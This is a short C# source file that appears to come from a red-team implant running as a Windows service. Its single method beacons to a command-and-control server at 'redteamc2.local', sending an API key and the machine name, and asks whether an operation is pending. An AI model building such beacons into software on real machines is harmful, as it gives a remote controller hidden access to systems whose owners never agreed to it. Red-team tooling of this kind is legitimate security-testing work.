using Newtonsoft.Json;
namespace App.WindowsService;

public class Checkin
{
    public bool GetPendingC2op(Config config)
    {
        using(var client = new HttpClient())
        {
            var endpoint = new Uri($"http://redteamc2.local:8888/endpoints/agent/get-pending/{config.api_key}/{Environment.MachineName}");
            var result = client.GetAsync(endpoint).Result;
            var statusCode = (int)result.StatusCode;
            if(statusCode == 200)
            {
                var json = result.Content.ReadAsStringAsync().Result;
                var data = JsonConvert.DeserializeObject<JSONResponse>(json);
                if (data != null)
                {
                    return data.IsPending;
                }
            }
            return false;
        }
    }
}

public class JSONResponse
{
    public bool IsPending { get; set; }
}

